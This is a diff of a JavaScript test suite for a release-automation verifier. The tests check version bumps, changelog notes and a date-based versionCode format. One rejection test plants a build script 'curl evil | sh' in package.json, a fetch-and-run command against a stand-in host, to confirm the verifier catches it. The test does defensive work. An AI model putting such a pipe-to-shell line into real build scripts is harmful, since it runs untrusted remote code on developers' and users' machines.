@@ -48,15 +48,15 @@ describe('release-automation', () => {
     const base = changelog('### Added\n- New.\n', RELEASED);
     const plan = planChangelogBump(base, '0.6.0', '2026-11-27');
     const pkg = (version, extra = {}) => `${JSON.stringify({ name: 'tens', version, versionCode: 260728000, scripts: { build: 'vite build' }, ...extra }, null, 2)}\n`;
-    // RELEASED has no 2026-11-27 section, so the bump's versionCode is that day's first: 261127000.
-    const head = (version, extra = {}) => pkg(version, { versionCode: 261127000, ...extra });
+    // The bump is stamped 2026-11-27; any valid HHMM that day (YYDDDHHMM 26331HHMM) is accepted.
+    const head = (version, extra = {}) => pkg(version, { versionCode: 263311330, ...extra });
     const args = { baseChangelog: base, basePackage: pkg('0.6.0'), headChangelog: plan.nextText, headPackage: head('0.7.0') };
 
     it('accepts what runBumpVersion actually writes (not a hand-built manifest)', () => {
       const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'verify-pr-'));
       fs.writeFileSync(path.join(dir, 'CHANGELOG.md'), base);
       fs.writeFileSync(path.join(dir, 'package.json'), pkg('0.6.0'));
-      runBumpVersion({ rootDir: dir, date: '2026-11-27' });
+      runBumpVersion({ rootDir: dir, date: '2026-11-27', time: '0915' });
       const headPackage = fs.readFileSync(path.join(dir, 'package.json'), 'utf8');
       expect(verifyReleasePr({ ...args, headPackage, headChangelog: fs.readFileSync(path.join(dir, 'CHANGELOG.md'), 'utf8') }))
         .toEqual({ ok: true, version: '0.7.0' });
@@ -76,7 +76,9 @@ describe('release-automation', () => {
     it.each([
       ['wrong version', { headPackage: head('0.6.1') }, /expected 0.7.0/],
       ['other package.json edits', { headPackage: head('0.7.0', { scripts: { build: 'curl evil | sh' } }) }, /more than the/],
-      ['wrong versionCode', { headPackage: head('0.7.0', { versionCode: 261127001 }) }, /more than the/],
+      ['versionCode for another day', { headPackage: head('0.7.0', { versionCode: 263321330 }) }, /not YYDDDHHMM/],
+      ['versionCode with an invalid time', { headPackage: head('0.7.0', { versionCode: 263312460 }) }, /not YYDDDHHMM/],
+      ['versionCode not above the base', { basePackage: pkg('0.6.0', { versionCode: 263311330 }) }, /not YYDDDHHMM/],
       ['edited notes', { headChangelog: plan.nextText.replace('- New.', '- Sneaky.') }, /differs/],
       ['nothing to release', { baseChangelog: changelog('### Added\n', RELEASED) }, /nothing to release/],
     ])('rejects %s', (_name, override, reason) => {
